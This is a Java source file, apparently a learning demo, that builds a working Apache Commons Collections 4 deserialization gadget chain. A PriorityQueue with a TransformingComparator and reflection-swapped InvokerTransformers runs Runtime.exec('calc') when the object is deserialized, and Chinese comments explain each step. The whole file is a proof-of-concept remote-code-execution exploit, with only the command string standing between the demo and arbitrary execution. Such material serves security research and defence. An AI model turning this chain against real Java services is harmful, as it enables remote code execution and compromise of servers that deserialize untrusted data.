package org.chabug.demo;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.chabug.util.Serializables;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class MyCC {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                // 使用Runtime.class.getMethod()反射调用Runtime.getRuntime()
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                // invoke()调用Runtime.class.getMethod("getRuntime").invoke(null)
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                // 调用exec("calc")
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };
        Transformer chain = new ChainedTransformer(transformers);

        Class clazz = ChainedTransformer.class;
        Field iTransformers = clazz.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);

        Transformer[] transformers1 = new Transformer[]{
                new InvokerTransformer("toString", new Class[]{}, new Object[]{})
        };
        ChainedTransformer chain1 = new ChainedTransformer(transformers1);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain1));
        queue.add("1");
        queue.add("1");
        iTransformers.set(chain1, transformers);

        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = Runtime.class;
        queueArray[1] = 1;


        byte[] bytes = Serializables.serializeToBytes(queue);
        Serializables.deserializeFromBytes(bytes);
    }
}
